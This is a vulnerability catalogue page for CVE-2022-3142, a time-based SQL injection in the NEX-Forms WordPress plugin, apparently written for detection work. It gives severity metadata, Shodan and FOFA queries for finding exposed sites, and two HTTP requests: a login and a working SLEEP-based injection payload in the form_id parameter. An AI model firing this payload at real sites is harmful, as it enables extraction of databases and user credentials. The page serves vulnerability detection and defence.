---
layout: post
cve_id: CVE-2022-3142
title: NEX-Forms Plugin < 7.9.7 - SQL Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-3142.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-3142.yaml
snort2_rule: N/A
snort3_rule: N/A
author: r3Y3r53
severity: high
impact: 'Authenticated attackers with form statistics viewing permissions can execute
  SQL injection through the form_id parameter to extract the complete WordPress database
  including user credentials, email addresses, and sensitive site data.

  '
remediation: Fixed in version 7.9.7
reference:
- https://wpscan.com/vulnerability/8acc0fc6-efe6-4662-b9ac-6342a7823328/
- https://www.exploit-db.com/exploits/51042
- https://nvd.nist.gov/vuln/detail/CVE-2022-3142
- http://packetstormsecurity.com/files/171477/WordPress-NEX-Forms-SQL-Injection.html
- https://medium.com/%40elias.hohl/authenticated-sql-injection-vulnerability-in-nex-forms-wordpress-plugin-35b8558dd0f5
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2022-3142
  cwe-id: CWE-89
  epss-score: 0.22872
  epss-percentile: 0.95704
  cpe: cpe:2.3:a:basixonline:nex-forms:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: basixonline
  product: nex-forms
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/nex-forms-express-wp-form-builder/
  fofa-query: body=/wp-content/plugins/nex-forms-express-wp-form-builder/
  publicwww-query: /wp-content/plugins/nex-forms-express-wp-form-builder/
tags:
- time-based-sqli
- cve
- cve2022
- wpscan
- packetstorm
- wordpress
- sqli
- wp-plugin
- wp
- authenticated
- basixonline
- vuln
---

## ðŸ” Vulnerability Description
The NEX-Forms WordPress plugin before 7.9.7 does not properly sanitise and escape user input before using it in SQL statements, leading to SQL injections. The attack can be executed by anyone who is permitted to view the forms statistics chart, by default administrators, however can be configured otherwise via the plugin settings.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=oo9M1l&pwd=T7wrro&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin.php?page=nex-forms-dashboard&form_id=1+AND+(SELECT+42+FROM+(SELECT(SLEEP(7)))b)-- HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

